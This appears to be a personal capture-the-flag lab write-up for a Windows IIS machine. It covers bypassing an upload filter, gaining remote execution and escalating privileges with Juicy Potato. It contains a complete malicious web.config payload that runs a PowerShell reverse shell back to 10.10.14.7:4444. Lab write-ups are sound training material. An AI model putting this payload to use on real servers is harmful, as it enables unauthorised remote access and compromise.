## Takeaway
- Different ways to get PowerShell reverse shell
	- 1. Invoke-PowerShellTcp.ps1 (nishang)
	- 2. Invoke-ConPtyShell.ps1
- `netcat` can be very useful if your initial reverse shell is behaving weirdly. One needs to transfer `netcat` to download file from victim machine anyway so why not just transfer upon initial foothold.
## Metadata
- Arbitrary File Upload aspx file identified by `gobuster`.![[Pasted image 20231219184216.png]]![[Pasted image 20231219184239.png]]
- Files uploaded can be found under  `http://10.10.10.93/uploadedfiles`.
#### 
- <mark>Exploitation</mark>
	- Upload a reverse shell payload named `web.config` since directly upload of file with extension `.aspx` is disallowed.
	```bash
	<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%@ Language=VBScript %>
<%
  call Server.CreateObject("WSCRIPT.SHELL").Run("powershell.exe -c $client = New-Object System.Net.Sockets.TCPClient('10.10.14.7',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()")
%>
	```
	- Execute payload by navigating to `http://10.10.10.93/uploadedfiles/web.config`.
- User merlin has dangerous `SeImpersonatePrivilege` enabled.![[Pasted image 20231220214831.png]]
- <mark>Post-Exploitation</mark>'
	- Use `juicy potato` to escalate privileges![[Pasted image 20231220215012.png]]![[Pasted image 20231220215451.png]]
	```bash
	https://github.com/ohpe/juicy-potato/tree/master
	```